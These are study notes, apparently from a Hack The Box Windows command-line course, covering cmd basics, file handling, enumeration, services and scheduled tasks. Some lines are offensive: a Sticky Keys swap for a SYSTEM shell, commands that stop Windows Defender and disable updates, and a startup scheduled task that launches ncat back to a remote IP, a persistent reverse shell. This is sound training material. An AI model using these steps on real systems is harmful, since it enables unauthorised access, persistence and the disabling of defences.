# CMD

# Intro

- Two command line tools: to control OS, applications, automate routine tasks
  - cmd.exe
  - powershell

- cmd.exe VS powershell
  - In PowerShell: you can run cmd commands
  - In CMD: you need to preface `powershell` before powershell commands: `powershell get-alias`

  - 1981                                        vs     2006
  - batch commands (cmd commands)               vs     cmdlets (powershell commands)
  - only batch commands                         vs     powershell commands & batch commands
  - no support command alises                   vs     support command aliases
  - no command output passed to other commands  vs     cmdlet outputs can be passed to other cmdlets
  - one command finishes, then other one runs   vs     execute a sequence of cmdlets in a script
  - no ISE (Integrated Scripting Env)           vs     has ISE
  - no access to programming libraries          vs     built on the .NET, can access to programming libraries
  - no run on Linux system                      vs     can run on the Linux systems

- connection:   openvpn --config vpnfile.ovpn
                ssh htb-student@<IP-Address>

# Command Prompt Basics

- How to access to cmd.exe:
  - Local Access: 1) Windows + r >> cmd; 2) C:\Windows\System32\cmd.exe
  - Virtual Access: Requires the user to be connected to the same network or have a route to the machine:
    - Possible through: `telnet`, `ssh`, `PsExec`, `WinRM`, `RDP` and etc

- Case Study: *Sticky Keys*
  - This accessibility program enables to work with special keys: Ctrl, Alt for shortcuts to avoid holding multiple keys
  - When you are in repair mode in windows and if you press the Shift button 5 times
  - You call "Sticky Keys" which is `seth.exe`. The risk is that if `seth.exe` is replaced by `cmd.exe`
  - The system launches `cmd.exe` with *SYSTEM-level Priveleges* >> change admin password, full access

- Exercises:
  - System32 >> cmd.exe can be found

# Getting Help

- Commands:
  - `doskey /history` >> to show the history of used commands
  - `page up`         >> places the first command
  - `page down`       >> places the last command
  - `->`              >> types the last command
  - `F3`              >> retype entire the previous command
  - `F5`              >> pressing multiple times shows previous commands
  - `F7`              >> interatice list of commands
  - `F9`              >> number for the position of the necessary command

# System Navigation

- Commands:
  - `cd` ou `chdir`            >> montrer ton position current
  - `C:\`                      >> root directory >> le premiere internal hard drive
  - `A:\` ou `B:\`             >> floppy disk drives
  - `cd C:\Users\htb\Pictures` >> `absolute path`
  - `cd .\Pictures             >>`relative path` >> its position is relative to the current working directory
  - `tree`                     >>  voir la structure du fichier, suelement des repertoires
  - `tree /F`                  >>  voir les repertoires avec les fichiers

- Repertoires Utiles:
  - %SYSTEMROOT%\Temp  >> `C:\Windows\Temp`                    >> accessible to all users with full rwx
  - %TEMP%             >> `C:\Users\<user>\AppData\Local\Temp` >> temp files for specific user
  - %PUBLIC%           >> `C:\Users\Public`                    >> alternative to global windows temp directory, with full rwx
  - %ProgramFiles%     >> `C:\Program Files`                   >> 64-bit applications
  - %ProgramFiles(x86) >> `C:\Program Files (x86)`             >> 32-bit applications

# Working with Directories & Files

- Commands:
  - `md` ou `mkdir`  >> creer un repertoire
  - `rd` ou `rmdir`  >> supprimer un repertoire
  - `rd /S`          >> supprimer un non-empty repertoire

- Move:
  - `move` >> to move the files & folders
  - `move file.txt C:\Users\htb\Downloads

- Xcopy:`xcopy` shines since it can remove the `Read-only bit` from files when moving them:
  - xcopy will reset any attributes the file had

  - `xcopy file_to_copy new_destination options`
  - `xcopy hello ..\ /E` >>    /E >> to copy any files and subdirectories to include empty directories
  - `xcopy hello ..\ /K` >>    /K >> to retain the file's attributes ( such as read-only or hidden )

- Robocopy: improved version of xcopy
  - In Robocopy, the source must be a *directory*, and the filename is specified separately at the end.
        -`robocopy ..\..\ C:\Users\htb-student\Downloads\ hi.txt`

  - move/copy files locally, to different drives even accross a network
  - retain with all details: ACLs, timestamp, any flags: hidden or read-only
  - made for large repertoires & drive syncing
  - work with system, read-only and hidden files

  - if we do not have the `SeBackupPrivilege` and `auditing privilege` >> stop us from duplicating
        -`/MIR`   swich is a workaround in this case
        -`/A:-SH` using this, we can clear the additional attributes
  - Switches:
    - /E >> to include empty dirs
    - /B >> to signal for backup copy
    - /L >> what-if command >> it will issue the command but not execute it; just shows you the potential result

    - /MIR >> (Mirror) makes the destination exactly like the source (deletes extra files)
    - /E   >> copies all subdirectories, including empty ones
    - /MT  >> allows parallel copying of files.
    - /R   >> retries
    - /W   >> wait time
    - /LOG >> logs the output

  - Commands:
    - `robocopy /E /MIR /L  ..\help .\`
    - `robocopy C:\Source D:\Backup /E /COPY:DAT /LOG:log.txt`
      - Copies everything (/E),
      - Retains Data, Attributes, Timestamps (/COPY:DAT),
      - Logs output to log.txt

- Files
  - Content View:
    - `more`      >> `more /S` >> to shrunk big spaces to the single line of space in large data files
    - `openfiles` >> need admin prive >> can view open files, disconnect open files, kick users from accessing specific files
    - `type`      >> file redirection possible
      - `type passwords.txt >> secrets.txt` >> appending passwords.txt at the end of secrets.txt

  - Create or Modify:
    - `echo`
    - `fsutil`  >> `fsutil file createNew <fileName> <lenght>` : `fsutil file createNew yalla.txt 222`
    - `ren`     >> to change the name of the file: `ren yalla.txt habibi.txt`
    - `rename`  >> same as `ren`
    - `replace` >>

    - `<`      >> to search for keywords, strings:
      - `find /i "joe" < yalla.txt` >> searches for the string, joe, in the file yalla.txt
    - `|`      >> piping
      - `ipconfig /all | find /i "IPv4"`

    - `&`  >> Run A then Run B: Not Depended:
      - `ping 8.8.8.8 & type hello.txt`

    - `&&` >> Run A, if succeeds, then Run B: Depended
      - `cd .\Documents && echo Yalla Joe Yalla > jamba.txt`

    - `||` >> Run A, if fails, then Run B

  - Delete
    - `del`: del file_name
      - `del /A:R *` >> to delete all Read-only files
      - `del /A:H *` >> to say good bye to the hidden files
      - `del /F`     >> to force delete

    - `erase`: erase file_name
    - `dir /A:R` >> to show the files with Read-only attribute
    - `dir /A:H` >> to show the files with hidden attribute
    -
  - Copy
    - `copy`: `copy secrets.txt ..\..\my_secrets.txt /V`
    - `/V`    >> copy validation or confirmation

# Gathering System Info

- Host Enumeration: *What Need To Look For?*

  - General System Info
    - hostname
    - OS name & version, config
    - installed hostfixes & patches
  - Network Info
    - host IP address
    - available network interfaces
    - accessible subnets
    - DNS servers
    - known hosts
    - network resources
  - Basic Domain Info
    - Contains Active Directory information regarding the domain to which the target system is connected.
  - User Info
    - local users & groups
    - env variables
    - current running tasks
    - scheduled tasks
    - known services

- Commands:
  - `systeminfo`      >> excellent tool
  - `hostname`
  - `ver`             >> to get the windows version
  - `arp /a`          >> see all the hosts that have come into contact or had some prior communication with our target
  - `whoami /all`     >> all full info, user, groups, privileges
  - `whoami /priv`    >> privileges
  - `whoami /groups`  >> groups info

- net * commands
  - `net user`        >> to see the available users on the host machine
  - `net group`       >> domain group information if the host is joined to the domain.
    - Keep in mind, net group must be run against a domain server such as the DC
  - `net localgroup`  >>

  - `net share`  >> to see shared resources
    - nice place to upload *payloads* across the hosts, & to keep persistence to escalate privileges
  - `net view`   >> to see shared resources in the broader scope

# Finding Fichiers & Repertoires

- Commands:
  - `where`
    - `where calc.exe`
    - `where /R C:\Users\student\ bio.txt` >> /R switch to look for the files recursively
    - `where /R C:\Users\student\ *.csv`  
  - `find`
    - mostly for text strings
    - `find "password" "C:\Users\htb-student\Downloads\passwords.txt"`
    - `find /V /N /I "IP Address" example.txt`
      - /V >> shows the un-matched lines, negative clause
      - /N >> shows line numbers
      - /I >> ignore case sensitivity
  - `findstr`
    - think of this as `find2.0`
    - regex values, patterns
    - `findstr` is similar to the `grep`

- Sorting Files
  - `comp`
    - check each byte within two files looking for differences
    - scripts, executable, critical files

    - `comp .\file1 .\file2`
    - `comp .\file1 .\file2 /A /L`
      - /A >> to show the results in ASCII format
      - /L >> to show the line numbers
  - `fc`
    - fc.exe /?
    - `fc passwords.txt mode.txt /N` >> /N to show the line numbers
    - text files, spreedsheets or lists

  - `sort`
    - in PS: `sort.exe .\file1.md /0 .\sorted_text.md`
      - we take the output from file1.md and send it with /0 modifier to the sorted_text.md as sorted
    - `sort.exe .\sorted_text.md /unique`
      - /unique >> to show the unique elements & remove the duplicates

# Environment Variables

- Env Var:
  - settings that are often applied globally to our hosts
  - accessed by the users and apps
  - not case sensitive
  - cannot have a name starting with a number or include an equal sign

- Scope:
  - `Global`  >> accessible to all
  - `User`    >> accessible to only the current user, goodbye after
  - because they are stored in the `process scope` by default, which means they are only available for the duration of that session
  - `Process` >> accessible to the currenly running processes, goodbye after the closing the session

- Commands:
  - `set`
    - available till the next session, not permanent
    - `set HELLO=HTB{Hola, Hola}` >> this sets HELLO to the value HTB{Hola, Hola},
    - `echo %HELLO%`              >> shows the value of the HELLO env var

  - `setx`
    - permanent, modifies the registry
    - `setx DCIP 172.20.103.12` >> permanently sets DCIP variable to the value 172.20.103.12
    - `setx DCIP 132.34.232.12` >> *editing* the variable to the new value
    - `echo %DCIP%`             >> to validate the result
  - Remove Var:
    - `setx DCIP ""` >> setting them equal to nothing >> this will delete the ENV VAR

- Vital ENV VAR:
  - `%PATH`           >> Specifies a set of directories(locations) where executable programs are located
  - `%OS%`            >> Current OS
  - `%SYSTEMROOT%`    >> Expands to C:\Windows.
  - `%LOGONSERVER%`   >> We can use this information to know if a machine is joined to a domain or workgroup
  - `%USERPROFILE%`   >> Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}
  - `%ProgramFiles%`  >> 64-bit apps

# Managing Services

- Service Controller:
  - `sc query type= service` >> to *list all the running services*
  - `sc query windefend`     >> to query specific service
  - `sc stop windefend`      >> to *stop* the specific service
  - `sc start windefend`     >> to *start* the specific service
- Modify Services:
  - To configure services, we use `config` parameter in *sc*
  - Disabling Windows Updates
    - `wuauserv` >> Windows Update Service
    - `bits`     >> Background Intelligence Transfer Service

    - `sc query wuauserv`                   >> to see the status
    - `sc stop wuauserv`                    >> to stop the service
    - `sc config wuauserv start= disabled`  >> to disable the service/ modify configurations

    - Now, the services are disabled, if you start them again, they won't start since you changed the configurations
    - `sc config wuauserv start= auto`      >> to revert everything back to normal

    - `sc config` command modifies the service's configuration in the Windows Registry, making the change permanent after the reboot

- Other Ways To Query Services:
  - `tasklist`
    - `tasklist /svc` >> to see a list of the processes *genial*
  - `net start` >> to see the list of the proceses
    - `net stop <service_name>`
    - `net pause <service_name>`
    - `net continue <service_name>`

  - `WMIC`: Windows Management Instrumention Command
    - `wmic service list brief` >> to see the through list of all processes: running & not running even

# Working With Scheduled Tasks

- Commands:
  - `schtasks /query /v /fo list`
  - `schtasks /create /sc ONSTART /tn "name_of_the_task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`
  - `schtasks /change /tn "name_of_the_task" /ru administrator /rp "password_of_the_account"`
  - `schtasks /query /tn "name_of_the_task" /v /fo list`
    - `/v` >> sets verbosity to on
    - `/fo` >> sets formatting options: list, table, csv
    - `tn` >> sets the name
    - `tr` >> sets the trigger and task to be run
    - `sc` >> sets the schedule
